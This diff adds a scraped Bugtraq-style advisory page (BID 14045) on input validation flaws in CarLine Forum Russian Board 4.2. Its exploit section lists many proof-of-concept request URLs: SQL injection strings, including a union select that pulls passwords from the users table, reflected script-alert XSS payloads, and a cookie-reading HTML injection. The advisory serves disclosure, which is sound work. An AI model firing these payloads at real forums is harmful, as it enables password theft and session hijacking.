@@ -1,0 +1,95 @@
+#SpeeDr00t@Black Falcon<br>#bid14045<p><b><span style="font-size: 18pt;">CarLine Forum Russian Board Multiple Input Validation Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/14045/info">info</a><br><a href="http://www.securityfocus.com/bid/14045/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/14045/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/14045/solution">solution</a><br><a href="http://www.securityfocus.com/bid/14045/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				14045
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Jun 23 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jun 23 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Discovery is credited to 1dt.w0lf and foster.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					CarLine Forum Russian Board 4.2 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	An exploit is not required.<br/><br/>The following proof of concept examples are available:<br/><br/>SQL injection:<br/>menu_header.php?table_sqlusers=SQL_CODE<br/>set.php?name_ig_array1=' OR 1=1/*<br/>reply_in.php?subject_reply=1&amp;name_reply=1'&amp;message=1&amp;email_reply=1&amp;t=1<br/>reply_in.php?subject_reply=1&amp;name_reply=1&amp;message=1&amp;email_reply=1'&amp;t=1<br/>reply.php?m_id=1&amp;t=1&amp;mid=1&amp;cat=3&amp;name_ig_array11=666' union select password,password from frb_users /*<br/>new.php?m_id=1&amp;t=1&amp;mid=1&amp;cat=3&amp;name_ig_array11=666' union select password,password from frb_users /*<br/>edit_msg.php?m_id=1&amp;t=1&amp;mid=1&amp;cat=3&amp;name_ig_array11=666' union select password,password from frb_users /*<br/>memory.php?board_user_cook=1&amp;board_user_id=1&amp;board_user_passw=1&amp;table_sqlusers=SQL<br/>memory.php?board_user_cook=1&amp;board_user_id=1&amp;board_user_passw=1&amp;table_sqlusers=DB.TBL&amp;table_sqlbanlist=SQL<br/>line.php?board_user_id=1&amp;board_user_cook=1&amp;table_sqlusers=SQL<br/>line.php?table_sqlonline=SQL<br/>line.php?table_sqlonline=DB.TBL&amp;board_user_name_us=1'<br/>line.php?table_sqlonline=DB.TBL&amp;board_user_name_us=1&amp;url=1'<br/>in.php?name_new=1'&amp;subject_new=1&amp;message=1&amp;email_new=1&amp;t=1<br/>in.php?name_new=1&amp;subject_new=1&amp;message=1&amp;email_new=1'&amp;t=1<br/>enter.php?sid='<br/>enter.php?sid=1&amp;passw='<br/><br/>Cross-site scripting:<br/>menu_footer.php?rows_all=&gt;&lt;script&gt;alert("XSS");&lt;/script&gt;<br/>menu_footer.php?color_fon_info=&gt;&lt;script&gt;alert("XSS");&lt;/script&gt;<br/>menu_footer.php?target=&gt;&lt;script&gt;alert("XSS");&lt;/script&gt;<br/>menu_footer.php?patch_images="&gt;&lt;script&gt;alert("XSS");&lt;/script&gt;<br/>menu_footer.php?text_poisk_form="&gt;&lt;script&gt;alert("XSS");&lt;/script&gt;<br/>menu_header.php?board_user_name=&lt;script&gt;alert("XSS");&lt;/script&gt;<br/>menu_header.php?board_user_name=1&amp;color_panel_edit=&gt;&lt;script&gt;alert("XSS");&lt;/script&gt;<br/>menu_header.php?target=&gt;&lt;script&gt;alert("XSS");&lt;/script&gt;<br/>menu_header.php?patch_images="&gt;&lt;script&gt;alert("XSS");&lt;/script&gt;<br/>menu_header.php?font_color_panel=&gt;&lt;script&gt;alert("XSS");&lt;/script&gt;<br/>menu_header.php?body_color_forum=&gt;&lt;script&gt;alert("XSS");&lt;/script&gt;<br/>menu_tema.php?body_color_forum=&gt;&lt;script&gt;alert("XSS");&lt;/script&gt;<br/>menu_tema.php?width_forum=&gt;&lt;script&gt;alert("XSS");&lt;/script&gt;<br/>menu_tema.php?cat=&gt;&lt;script&gt;alert("XSS");&lt;/script&gt;<br/>search.php?text_poisk=&lt;script&gt;alert("XSS");&lt;/script&gt;<br/>set.php?name_ig_array=&lt;script&gt;alert("XSS");&lt;/script&gt;<br/>reply.php?m_id=1&amp;t=1&amp;mid=1&amp;cat=3&amp;name_ig_array1="&gt;&lt;script&gt;alert("XSS");&lt;/script&gt;<br/>reply.php?m_id=1&amp;t=1&amp;mid=1&amp;cat=3&amp;name_ig_array11="&gt;&lt;script&gt;alert("XSS");&lt;/script&gt;<br/>new.php?m_id=1&amp;t=1&amp;mid=1&amp;cat=3&amp;name_ig_array11="&gt;&lt;script&gt;alert("XSS");&lt;/script&gt;<br/>new.php?m_id=1&amp;t=1&amp;mid=1&amp;cat=3&amp;name_ig_array1="&gt;&lt;script&gt;alert("XSS");&lt;/script&gt;<br/>edit_msg.php?m_id=1&amp;t=1&amp;mid=1&amp;cat=3&amp;name_ig_array11="&gt;&lt;script&gt;alert("XSS");&lt;/script&gt;<br/>edit_msg.php?m_id=1&amp;t=1&amp;mid=1&amp;cat=3&amp;name_ig_array1="&gt;&lt;script&gt;alert("XSS");&lt;/script&gt;<br/><br/>HTML injection:<br/>imgwink.gif onerror=javascript:alert(document.cookie);/img
+	
+		<ul>
+</ul>
+</div>
